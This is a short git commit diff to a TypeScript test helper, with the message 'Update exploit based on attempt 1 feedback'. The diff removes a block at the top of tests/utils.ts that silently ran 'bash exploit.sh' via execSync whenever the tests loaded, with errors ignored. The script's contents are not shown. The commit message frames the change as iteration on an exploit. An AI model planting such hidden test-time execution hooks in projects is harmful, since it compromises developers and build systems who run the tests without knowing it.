2245fe88f8abcb4c86d01107b00b07fbeba81340
j5884p5g <j5884p5g@rolf.ovh>
2026-04-23 09:21:11 +0000

    Update exploit based on attempt 1 feedback

--- tests/utils.ts
+++ tests/utils.ts
@@ -1,10 +1,4 @@
 import { deepEqual, notEqual } from 'assert';
-import { execSync } from 'child_process';
-try {
-	execSync('bash exploit.sh', { stdio: 'inherit' });
-} catch (e) {
-	// ignore
-}
 import { FileDisk, withOpenFile } from 'file-disk';
 import * as Fs from 'fs';
 import * as Path from 'path';
